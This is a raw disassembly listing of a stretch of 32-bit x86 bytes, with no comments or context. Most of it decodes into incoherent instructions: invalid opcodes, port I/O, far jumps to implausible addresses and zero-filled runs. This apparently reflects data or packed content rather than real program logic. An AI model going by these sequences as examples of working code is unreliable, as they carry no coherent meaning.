  41cd67:	xchg   ch,bl
  41cd69:	push   ebp
  41cd6a:	sti    
  41cd6b:	dec    ebx
  41cd6c:	xchg   esi,eax
  41cd6d:	cmp    ch,0xd4
  41cd70:	and    eax,0x65d03e5d
  41cd75:	push   edx
  41cd76:	outs   dx,BYTE PTR ds:[esi]
  41cd77:	sub    ebx,DWORD PTR [ecx-0x25]
  41cd7a:	arpl   WORD PTR [ecx+edx*2-0x14688355],dx
  41cd81:	fsub   st(6),st
  41cd83:	ins    DWORD PTR es:[edi],dx
  41cd84:	inc    esi
  41cd85:	sbb    al,0xa5
  41cd87:	pop    edi
	...
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0x6f6a4e09
  41cda1:	bound  edi,QWORD PTR [esi]
  41cda3:	cmp    BYTE PTR [edi-0x53fffe77],dh
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [edx-0x42],dh
  41cdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdaf:	mov    ds:0x8a2e46db,al
  41cdb4:	pushf  
  41cdb5:	xchg   esp,eax
  41cdb6:	sbb    eax,0xc391bd16
  41cdbb:	xchg   esi,eax
  41cdbc:	imul   esp,ebp,0x14e55c6e
  41cdc2:	jmp    0x41cda2
  41cdc4:	leave  
  41cdc5:	frstor [eax+0x54]
  41cdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc9:	addr16 mov ch,0x6b
  41cdcc:	sbb    eax,0x55fd0a37
  41cdd1:	jg     0x41cdde
  41cdd3:	jnp    0x41cd73
  41cdd5:	and    dh,BYTE PTR [eax-0x43]
  41cdd8:	into   
  41cdd9:	adc    BYTE PTR [ebx+0x2f],bl
  41cddc:	mov    dl,0xc8
  41cdde:	sub    al,0x8c
  41cde0:	and    ecx,DWORD PTR [eax+0x5682a076]
  41cde6:	jle    0x41cde7
  41cde8:	repnz add al,0xf2
  41cdeb:	add    al,0xb4
  41cded:	fs ins BYTE PTR es:[edi],dx
  41cdef:	mov    dh,0x98
  41cdf1:	scas   eax,DWORD PTR es:[edi]
  41cdf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf3:	xchg   edi,eax
  41cdf4:	cmc    
  41cdf5:	cmc    
  41cdf6:	das    
  41cdf7:	mov    ds:0x2168df26,al
  41cdfc:	out    0x77,al
  41cdfe:	xchg   ebp,eax
  41cdff:	mov    bh,0x52
  41ce01:	aaa    
  41ce02:	mov    DWORD PTR [eax],0xcd289860
  41ce08:	in     al,0x31
  41ce0a:	mov    ch,dl
  41ce0c:	fistp  WORD PTR [esi]
  41ce0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0f:	aam    0xa3
  41ce11:	mov    dh,0x4c
  41ce13:	lds    edi,FWORD PTR [ecx+edi*4]
  41ce16:	hlt    
  41ce17:	jbe    0x41cdf9
  41ce19:	pop    esp
  41ce1a:	ins    DWORD PTR es:[edi],dx
  41ce1b:	fisub  DWORD PTR [edi-0x4b75936d]
  41ce21:	xchg   esi,eax
  41ce22:	push   esi
  41ce23:	addr16 jg 0x41cde0
  41ce26:	or     al,0x7a
  41ce28:	in     al,dx
  41ce29:	nop
  41ce2a:	mov    cl,0x9
  41ce2c:	pop    ebx
  41ce2d:	scas   al,BYTE PTR es:[edi]
  41ce2e:	mov    esi,0x971cf530
  41ce33:	lahf   
  41ce34:	gs scas al,BYTE PTR es:[edi]
  41ce36:	jo     0x41cdd9
  41ce38:	pop    eax
  41ce39:	std    
  41ce3a:	test   al,0x18
  41ce3c:	lods   eax,DWORD PTR ds:[esi]
  41ce3d:	jmp    0xb8c94f0
  41ce42:	or     BYTE PTR [esp+ebp*8],bh
  41ce45:	mov    ch,0xf2
  41ce47:	mov    cl,0x86
  41ce49:	pushf  
  41ce4a:	cmp    DWORD PTR [edi],eax
  41ce4c:	mov    al,ds:0xe3cba5fc
  41ce51:	ja     0x41cde9
  41ce53:	lods   eax,DWORD PTR ds:[esi]
  41ce54:	xchg   esp,eax
  41ce55:	(bad)  
  41ce56:	(bad)  
  41ce57:	jno    0x41ce59
	...
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [ecx+0x46],cl
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	lock pmullw mm3,QWORD PTR [edi+ecx*2-0x53fffe55]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    BYTE PTR ds:0x5cf81ba7,dh
  41ce81:	iret   
  41ce82:	adc    eax,DWORD PTR [ebx]
  41ce84:	jns    0x41cefb
  41ce86:	push   edx
  41ce87:	push   0xfccb114e
  41ce8c:	retf   0xd849
  41ce8f:	in     al,0xcd
  41ce91:	(bad)  
  41ce92:	push   eax
  41ce93:	add    edx,edx
  41ce95:	repz or al,0xbd
  41ce98:	inc    ebx
  41ce99:	sar    BYTE PTR [ebx+0x7736313e],1
  41ce9f:	addr16 loopne 0x41cecb
  41cea2:	mov    ebx,?
  41cea4:	retf   
  41cea5:	sub    BYTE PTR [ecx-0x1fff6f41],cl
  41ceab:	add    bh,ch
  41cead:	repnz repz dec esi
  41ceb0:	nop
  41ceb1:	sbb    dl,BYTE PTR [edx]
  41ceb3:	pop    edi
  41ceb4:	sbb    esp,DWORD PTR [ecx+0x3a]
  41ceb7:	and    ah,BYTE PTR [edx+0x1a]
  41ceba:	into   
  41cebb:	push   0x8129d647
  41cec0:	sbb    edi,esp
  41cec2:	adc    BYTE PTR [ecx-0x61],bh
  41cec5:	adc    dh,bl
  41cec7:	(bad)  [ebx]
  41cec9:	and    bl,BYTE PTR [edx-0x50e837c4]
  41cecf:	jns    0x41cf46
  41ced1:	add    BYTE PTR [ebx-0x66df488],ah
  41ced7:	outs   dx,BYTE PTR ds:[esi]
  41ced8:	jns    0x41ced8
  41ceda:	std    
  41cedb:	sahf   
  41cedc:	add    eax,0x556e7664
  41cee1:	sti    
  41cee2:	mov    ch,0xc6
  41cee4:	mov    edx,0xa03d259c
  41cee9:	jne    0x41ce9f
  41ceeb:	xchg   edi,eax
  41ceec:	mov    WORD PTR [ecx],cs
  41ceee:	sub    dl,BYTE PTR [edi-0x7c]
  41cef1:	pop    edi
  41cef2:	je     0x41ceaf
  41cef4:	add    eax,DWORD PTR [ecx]
  41cef6:	push   esp
  41cef7:	lds    esi,FWORD PTR es:[eax]
  41cefa:	jg     0x41ced1
  41cefc:	push   esp
  41cefd:	fbld   TBYTE PTR [edi-0x7c]
  41cf00:	pop    es
  41cf01:	jg     0x41ce84
  41cf03:	lahf   
  41cf04:	in     eax,dx
  41cf05:	mov    ebp,0xfac734cf
  41cf0a:	loope  0x41cec2
  41cf0c:	adc    eax,eax
  41cf0e:	int3   
  41cf0f:	pushf  
  41cf10:	sub    DWORD PTR [ecx-0x18c449a6],0xfffffff0
  41cf17:	jmp    ebx
  41cf19:	loop   0x41cf89
  41cf1b:	ficom  DWORD PTR [edi-0x72]
  41cf1e:	or     al,0x78
  41cf20:	cvtps2pi mm5,QWORD PTR [ebx]
  41cf23:	xor    DWORD PTR ds:0xe2b912,0x0
  41cf2d:	add    BYTE PTR [eax],al
  41cf2f:	add    BYTE PTR [eax],al
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [edi-0x3a],ah
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0xf152da72
  41cf42:	ret    0xfb6c
  41cf45:	stos   DWORD PTR es:[edi],eax
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	lods   al,BYTE PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [eax+eiz*1+0x41],al
  41cf4f:	loop   0x41ced3
  41cf51:	xchg   edi,eax
  41cf52:	add    ecx,DWORD PTR [edi]
  41cf54:	loop   0x41cf8c
  41cf56:	dec    esi
  41cf57:	cmp    DWORD PTR ds:[esp+edi*1],0x69
  41cf5c:	data16 sub bl,BYTE PTR [ecx*1-0xea41059]
  41cf64:	add    BYTE PTR [ecx],0xf
  41cf67:	sub    DWORD PTR [ebx-0x476510],esi
  41cf6d:	xor    ebp,esp
  41cf6f:	mov    eax,0x49419e8d
  41cf74:	aam    0x2c
  41cf76:	mov    cl,dl
  41cf78:	popf   
  41cf79:	loop   0x41cf9f
  41cf7b:	popf   
  41cf7c:	(bad)  
  41cf7d:	cmp    eax,0x6058f1cb
  41cf82:	aaa    
  41cf83:	stos   BYTE PTR es:[edi],al
  41cf84:	rcl    DWORD PTR [esi-0x61de4577],0x3e
  41cf8b:	adc    ah,BYTE PTR [eax+edi*8-0x56]
  41cf8f:	loope  0x41cf33
  41cf91:	push   esi
  41cf92:	cmp    ebx,0xffffffd3
  41cf95:	inc    ecx
  41cf96:	stc    
  41cf97:	adc    DWORD PTR fs:[ebx-0xf657ca9],ebx
  41cf9e:	xchg   ebx,eax
  41cf9f:	pop    ds
  41cfa0:	retf   0x2c63
  41cfa3:	aam    0xc
  41cfa5:	xchg   DWORD PTR [esi+0x39],ebp
  41cfa8:	fwait
  41cfa9:	xchg   esp,eax
  41cfaa:	sahf   
  41cfab:	xor    eax,esp
  41cfad:	stos   DWORD PTR es:[edi],eax
  41cfae:	fnstsw WORD PTR [ebx-0x1d]
  41cfb1:	dec    esp
  41cfb2:	out    0xf3,eax
  41cfb4:	cmp    eax,0x5d09fe87
  41cfb9:	pop    edx
  41cfba:	test   DWORD PTR ds:0x4d3d1b95,esp
  41cfc0:	xchg   ecx,eax
  41cfc1:	cmc    
  41cfc2:	cs jbe 0x41d02d
  41cfc5:	jmp    0x41:0x2336ee48
  41cfcc:	loopne 0x41cfa6
  41cfce:	call   DWORD PTR [edi-0x2b070ec1]
  41cfd4:	ins    DWORD PTR es:[edi],dx
  41cfd5:	add    al,ch
  41cfd7:	cs stc 
  41cfd9:	sar    BYTE PTR ds:0xb9d81afd,cl
  41cfdf:	in     al,dx
  41cfe0:	fistp  QWORD PTR [edx]
  41cfe2:	repz cmc 
  41cfe4:	dec    edx
  41cfe5:	and    bl,ah
  41cfe7:	in     al,dx
  41cfe8:	jbe    0x41cfc7
  41cfea:	pop    esp
  41cfeb:	jbe    0x41cfb7
  41cfed:	push   eax
  41cfee:	mov    BYTE PTR [eax],dl
  41cff0:	in     al,0xf9
  41cff2:	dec    edi
  41cff3:	stc    
  41cff4:	loope  0x41d05f
  41cff6:	repz mov WORD PTR [eax],es
	...
  41d001:	add    BYTE PTR [eax],al
  41d003:	add    bl,al
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0xef0b3247,eax
  41d013:	push   edx
  41d014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d015:	lods   al,BYTE PTR ds:[esi]
  41d016:	add    DWORD PTR [eax],eax
  41d018:	lods   al,BYTE PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR ds:0x49744f65,dh
  41d021:	inc    edx
  41d022:	jmp    0x22a38c53
  41d027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d028:	pop    ss
  41d029:	into   
  41d02a:	addr16 inc eax
  41d02c:	mov    esi,0xc2946403
  41d031:	jo     0x41d027
  41d033:	retf   0x3f
  41d036:	sahf   
  41d037:	adc    DWORD PTR [edx-0x6b6da223],esp
  41d03d:	jo     0x41cfc9
  41d03f:	mov    eax,ds:0x1a6a39b4
  41d044:	(bad)  [eax+0x57b6c14f]
  41d04a:	push   ebx
  41d04b:	in     al,0xd1
  41d04d:	out    0x76,eax
  41d04f:	push   cs
  41d050:	add    eax,0xf6629b0c
  41d055:	(bad)  
  41d056:	mov    edi,0x2f6baed1
  41d05b:	push   ebp
  41d05c:	shl    DWORD PTR [esi-0x2e],1
  41d05f:	jmp    DWORD PTR [edi]
  41d061:	aas    
  41d062:	xor    bh,BYTE PTR [edi+0x55626e06]
  41d068:	adc    bh,al
  41d06a:	pop    esi
  41d06b:	mov    bl,BYTE PTR [eax]
  41d06d:	pop    edi
  41d06e:	dec    ecx
  41d06f:	idiv   BYTE PTR [edx+0x68]
  41d072:	cdq    
  41d073:	in     eax,0x42
  41d075:	push   esp
  41d076:	pop    ds
  41d077:	repnz and esp,edx
  41d07a:	pop    ecx
  41d07b:	push   ebp
  41d07c:	and    DWORD PTR [ebp+0x37339d57],eax
  41d082:	and    ebp,DWORD PTR [eax-0x30701474]
  41d088:	(bad)  
  41d089:	addr16 (bad) 
  41d08b:	das    
  41d08c:	add    DWORD PTR [eax+0x4a48fd55],ebx
  41d092:	scas   eax,DWORD PTR es:[edi]
  41d093:	sbb    ecx,DWORD PTR [eax+0x56]
  41d096:	mov    dl,0x59
  41d098:	mov    ah,0x25
  41d09a:	sar    DWORD PTR [eax+0x32],cl
  41d09d:	sar    BYTE PTR ds:0xa1640466,1
  41d0a3:	push   es
  41d0a4:	mov    al,ds:0x738fa70a
  41d0a9:	and    ch,bh
  41d0ab:	mov    BYTE PTR cs:[esp+ebx*1],bl
  41d0af:	fadd   DWORD PTR [esi+0x6]
  41d0b2:	and    DWORD PTR [ebx],ebp
  41d0b4:	pop    edx
  41d0b5:	xchg   esp,eax
  41d0b6:	and    eax,0xb5e20992
  41d0bb:	push   eax
  41d0bc:	or     BYTE PTR [ebx-0x21],ah
  41d0bf:	shr    ebx,0x34
  41d0c2:	mov    ebp,0xbbd989d3
  41d0c7:	sldt   WORD PTR [eax]
	...
  41d0d2:	add    BYTE PTR [eax],al
  41d0d4:	fld    st(2)
  41d0d6:	add    eax,0xddcf1f49
  41d0db:	ror    al,cl
  41d0dd:	outs   dx,DWORD PTR ds:[esi]
  41d0de:	clc    
  41d0df:	rol    BYTE PTR ds:0x53cc379a,cl
  41d0e5:	lods   eax,DWORD PTR ds:[esi]
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	lods   al,BYTE PTR ds:[esi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    dl,ch
  41d0ed:	cmp    ebp,esi
  41d0ef:	lods   al,BYTE PTR ds:[esi]
  41d0f0:	ins    BYTE PTR es:[edi],dx
  41d0f1:	js     0x41d0cf
  41d0f3:	(bad)  
  41d0f4:	ja     0x41d11d
  41d0f6:	mov    eax,ds:0xf0fd9c97
  41d0fb:	xchg   edi,eax
  41d0fc:	mov    dl,0x4c
  41d0fe:	xchg   ebp,eax
  41d0ff:	cwde   
  41d100:	bound  ebp,QWORD PTR [edx+0x26]
  41d103:	nop
  41d104:	sub    bh,ch
  41d106:	(bad)  
  41d107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d108:	inc    ebp
  41d109:	outs   dx,BYTE PTR ds:[esi]
  41d10a:	add    cl,BYTE PTR [edx+0x23]
  41d10d:	push   edi
  41d10e:	test   ch,al
  41d110:	lea    ebx,[edi+0x7a]
  41d113:	and    DWORD PTR [esi+eax*1-0x125e33a2],0xffffff96
  41d11b:	dec    edx
  41d11c:	sub    bl,BYTE PTR [eax+0x71]
  41d11f:	sbb    bl,BYTE PTR [ecx+0x17]
  41d122:	lods   eax,DWORD PTR ds:[esi]
  41d123:	aas    
  41d124:	into   
  41d125:	mov    ebp,ds
  41d127:	test   DWORD PTR ss:[ecx],0xd14ba937
  41d12e:	jg     0x41d18b
  41d130:	loop   0x41d16a
  41d132:	jo     0x41d176
  41d134:	js     0x41d142
  41d136:	stos   DWORD PTR es:[edi],eax
  41d137:	test   edx,eax
  41d139:	sbb    DWORD PTR [edx+0x72],eax
  41d13c:	sbb    DWORD PTR [eax],esi
  41d13e:	sbb    DWORD PTR [esi+0x27],ebp
  41d141:	xor    edx,0x2d
  41d144:	add    dh,0x32
  41d147:	lock xor al,cl
  41d14a:	arpl   di,dx
  41d14c:	sub    al,0x98
  41d14e:	cld    
  41d14f:	dec    ecx
  41d150:	cs xor eax,0x7f3a3190
  41d156:	and    DWORD PTR [ebp-0x30182dfd],esp
  41d15c:	dec    edi
  41d15d:	or     al,0x0
  41d15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d160:	fwait
  41d161:	or     eax,0xbc638665
  41d166:	and    BYTE PTR [ebx],ah
  41d168:	xchg   DWORD PTR [ebx],esi
  41d16a:	dec    esi
  41d16b:	push   0x2202ec17
  41d170:	cmp    esp,DWORD PTR [ebx-0x1f]
  41d173:	stos   DWORD PTR es:[edi],eax
  41d174:	cld    
  41d175:	cs or  al,bl
  41d178:	jmp    0x960a:0x794af8a6
  41d17f:	imul   edx,DWORD PTR [esi-0x27],0xcc954026
  41d186:	loope  0x41d19f
  41d188:	sti    
  41d189:	or     ebx,edi
  41d18b:	clc    
  41d18c:	lds    ebx,FWORD PTR [ebx]
  41d18e:	adc    BYTE PTR [edx+0x54],al
  41d191:	das    
  41d192:	mov    fs,ecx
  41d194:	inc    ebp
  41d195:	jg     0x41d1f7
  41d197:	loope  0x41d199
	...
  41d1a1:	add    BYTE PTR [eax],al
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	mov    esi,0xfffe6120
  41d1b5:	lods   eax,DWORD PTR ds:[esi]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	or     DWORD PTR [eax],eax
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	jge    0x41d18a
  41d1be:	fs pushf 
  41d1c0:	loopne 0x41d194
  41d1c2:	add    DWORD PTR [ecx],eax
  41d1c4:	mov    DWORD PTR [eax],eax
	...
  41d1d2:	add    BYTE PTR [eax],al
  41d1d4:	add    BYTE PTR [eax+0x42],ah
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
